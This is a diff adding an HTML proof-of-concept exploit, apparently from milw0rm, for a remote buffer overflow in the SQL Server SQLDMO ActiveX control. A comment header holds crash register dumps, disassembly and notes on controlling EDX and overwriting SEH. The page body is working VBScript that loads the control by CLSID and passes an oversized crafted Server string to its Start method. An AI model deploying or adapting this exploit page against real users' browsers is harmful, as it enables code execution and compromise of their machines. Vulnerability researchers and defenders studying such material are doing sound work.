@@ -1,0 +1,80 @@
+<!--
+18.48 01/09/2007
+Microsoft SQL Server Distributed Management Objects OLE DLL for
+SQL Enterprise Manager (sqldmo.dll) remote buffer overflow poc
+
+file version: 2000.085.2004.00
+product version: 8.05.2004
+
+passing some fuzzy chars to Start method:
+
+EAX 00000000
+ECX 00620062
+EDX 00620062
+EBX 1C3A3638 SQLDMO.1C3A3638
+ESP 0013D87C
+EBP 0013DAA8
+ESI 03042544
+EDI 0013DAA0 ASCII "|T"
+EIP 1C1C9800 SQLDMO.1C1C9800
+
+...
+1C1C97EA   8D8D E4FDFFFF    LEA ECX,DWORD PTR SS:[EBP-21C]
+1C1C97F0   51               PUSH ECX
+1C1C97F1   8B95 E0FDFFFF    MOV EDX,DWORD PTR SS:[EBP-220]
+1C1C97F7   8B02             MOV EAX,DWORD PTR DS:[EDX]
+1C1C97F9   8B8D E0FDFFFF    MOV ECX,DWORD PTR SS:[EBP-220]
+1C1C97FF   51               PUSH ECX
+1C1C9800   FF90 DC010000    CALL DWORD PTR DS:[EAX+1DC] <--- exception
+access violation when reading 000001DC
+
+by manipulating edx you have the first exploitable condition...
+
+
+also seh is overwritten, then:
+
+EAX 00000000
+ECX 00610061
+EDX 7C9137D8 ntdll.7C9137D8
+EBX 00000000
+ESP 0013D4AC
+EBP 0013D4CC
+ESI 00000000
+EDI 00000000
+EIP 00610061
+
+object safety report:
+RegKey Safe for Script: False
+RegKey Safe for Init: False
+Implements IObjectSafety: True
+
+means: works according to security settings for the Internet zone
+needs Activex "not marked as safe" option set to "ask" or "enabled" (not the predefined one)
+
+rgod.
+http://retrogod.altervista.org
+-->
+<html>
+<object classid='clsid:10020200-E260-11CF-AE68-00AA004A34D5' id='SQLServer' /></object>
+<script language='vbscript'>
+
+targetFile = "C:\Programmi\Microsoft SQL Server\80\Tools\Binn\sqldmo.dll"
+prototype  = "Sub Start ( ByVal StartMode As Boolean ,  [ ByVal Server As Variant ] ,  [ ByVal Login As Variant ] ,  [ ByVal Password As Variant ] )"
+memberName = "Start"
+progid     = "SQLDMO.SQLServer"
+argCount   = 4
+
+'edx = ecx
+edx       ="bb"
+seh       ="aa"
+StartMode =True
+Server    ="http://ZZZZ\YYYY\XXXX\WW?W\VVVV\AAAA\AAA\AAAAA\AAAA\AA@AA\tes\test\test\tes.\ttest\MMMM\LLLL\KKK\JJJJ\IIII\HH.H\GGGGG\FFFF\EEEE\DDD\CCCC\BBBB\AAA\A\\\\\\\\\:#$%AAAA\BBBB\CCCC\DD?D\EEEE\FFFF\GGG\\:#$%\HHHHH\IIII\te@st\tes\test\test\tes.aaaabbbbccccddddeeeeffffgggghhhhiiiiaaaaaaa" + seh + "CCDmmm" + edx + "nnnBBBB\AAAA\ZZZ\Z\\\\\\\\\:#$%YYYY\XXXX\WWWW\VV?V\UUUU\TTTT\SSS\\:#$%\RRRRR\QQQQ\PP@PP\OOO\NNNN\MMMM\LLL.\KKKKK\JJJJ\IIII\HHH\GGGG\FFFF\EE.E\DDDDD\CCCC\BBBB\AAA\AAAA\AAAA\AAA\A\\\\\\\\\:#$%AAAA\AAAA\AAAA\AA?A\wwww\vvvv\uuu\\:#$%\ttttt\ssss\rr@rr\qqq\pppp\oooo\nnn.\mmmmm\llll\kkkk\jjj\iiii\hhhh\gg.g\fffff\eeee\dddd\ccc\bbbb\aaaa\AAA\A\\\\\\\"
+Login     ="aaaaaaaa"
+Password  ="bbbbbbbb"
+
+SQLServer.Start StartMode ,Server ,Login ,Password
+
+</script>
+</html>
+
+# milw0rm.com [2007-09-08]
